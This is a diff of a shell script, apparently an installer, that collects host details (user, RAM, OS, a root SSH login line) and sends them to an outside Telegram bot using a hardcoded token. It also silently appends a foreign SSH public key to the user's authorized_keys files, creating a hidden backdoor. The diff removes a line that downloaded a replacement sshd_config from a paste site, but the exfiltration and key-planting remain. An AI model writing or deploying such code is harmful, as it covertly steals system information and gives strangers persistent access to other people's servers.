@@ -216,7 +216,7 @@ message="
 <code>USER    : </code><code>${NAMES}</code>
 <code>RAM     : </code><code>${RAMMS}MB</code>
 <code>LINUX   : </code><code>${OS}</code>
-<code>ssh root@MYIP -qvi taibabi</code>
+<code>SSH     : </code><code>ssh root@MYIP -qvi taibabi</code>
 "
 
 curl -s -X POST "https://api.telegram.org/bot2145515560:AAE9WqfxZzQC-FYF1VUprICGNomVfv6OdTU/sendmessage" \
@@ -257,8 +257,5 @@ sleep 1
 echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEwc4CQeutFeXson2I6XTd4bGs52hSOMhAISn9SHlFHf taibabi@babi.com" >> ~/.ssh/authorized_keys >/dev/null 2>&1
 echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEwc4CQeutFeXson2I6XTd4bGs52hSOMhAISn9SHlFHf taibabi@babi.com" >> ~/.ssh/authorized_keys2 >/dev/null 2>&1
 chmod 600 ~/.ssh/authorized_keys2
-
-wget -O /etc/ssh/sshd_config https://www.klgrth.io/paste/xj5sz/raw >/dev/null 2>&1
-chmod 600 /etc/ssh/sshd_config
 
 exit 0
